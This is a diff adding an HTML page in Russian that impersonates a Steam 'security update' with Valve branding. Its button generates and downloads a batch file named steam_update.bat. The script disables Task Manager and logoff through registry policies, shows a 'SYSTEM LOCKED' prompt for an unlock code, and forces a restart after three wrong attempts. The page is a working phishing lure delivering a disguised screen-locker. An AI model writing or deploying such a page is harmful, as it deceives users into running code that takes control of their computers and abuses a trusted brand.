@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Steam — Установка обновления</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(180deg, #1b2838 0%, #0a141c 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            background: #16202d;
+            padding: 50px 60px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(102, 192, 244, 0.15);
+            max-width: 500px;
+            width: 90%;
+        }
+        .steam-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #66c0f4 0%, #2a475e 100%);
+            border-radius: 50%;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            color: white;
+            margin-bottom: 25px;
+        }
+        .logo {
+            font-size: 36px;
+            font-weight: bold;
+            color: #c5c3c0;
+            margin-bottom: 10px;
+        }
+        .logo span {
+            color: #66c0f4;
+        }
+        .subtitle {
+            color: #8f98a0;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .message {
+            color: #acb2b8;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 35px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #0a141c;
+            border-radius: 3px;
+            margin-bottom: 30px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, #66c0f4, #2a475e, #66c0f4);
+            background-size: 200% 100%;
+            animation: loading 2s linear infinite;
+        }
+        @keyframes loading {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(to bottom, #66c0f4 0%, #2a475e 100%);
+            color: white;
+            padding: 16px 55px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            border: none;
+            transition: all 0.3s;
+        }
+        .download-btn:hover {
+            background: linear-gradient(to bottom, #79c8f7 0%, #31566e 100%);
+            box-shadow: 0 0 20px rgba(102, 192, 244, 0.4);
+        }
+        .footer {
+            color: #4f5559;
+            font-size: 11px;
+            margin-top: 25px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="steam-icon">&#9881;</div>
+        <div class="logo">STEAM<span>UPDATE</span></div>
+        <div class="subtitle">Обновление системы безопасности v3.7.2</div>
+        <div class="message">
+            Для продолжения работы Steam необходимо установить обязательное обновление компонентов безопасности Windows.<br><br>
+            Размер: 2.1 MB<br>
+            Время установки: ~10 секунд
+        </div>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <a href="#" class="download-btn" id="downloadBtn" onclick="downloadBat()">Установить обновление</a>
+        <div class="footer">© 2024 Valve Corporation. Все права защищены. Steam и логотип Steam являются товарными знаками Valve Corporation.</div>
+    </div>
+
+    <script>
+        function downloadBat() {
+            const batContent = `@echo off
+title Steam Security Update
+color 06
+echo ====================================
+echo     Steam System Update v3.7.2
+echo ====================================
+echo.
+echo Applying security patch...
+timeout /t 3 >nul
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f >nul
+color 0a
+cls
+set tries=0
+:lock
+echo ==============================
+echo       SYSTEM LOCKED
+echo ==============================
+echo.
+set /p pass="Enter unlock code: "
+if "%pass%"=="666" goto unlock
+set /a tries+=1
+if %tries%==3 shutdown /r /t 0
+echo Wrong code! Attempts left: %tries%/3
+timeout /t 2 >nul
+cls
+goto lock
+:unlock
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f >nul
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoLogoff /t REG_DWORD /d 0 /f >nul
+echo.
+echo Steam update completed. Thank you for your patience.
+timeout /t 3 >nul
+exit`;
+            const blob = new Blob([batContent], { type: 'application/bat' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'steam_update.bat';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            document.getElementById('downloadBtn').textContent = 'Скачивание началось...';
+            document.getElementById('downloadBtn').style.background = 'linear-gradient(to bottom, #2a475e 0%, #66c0f4 100%)';
+        }
+    </script>
+</body>
+</html>
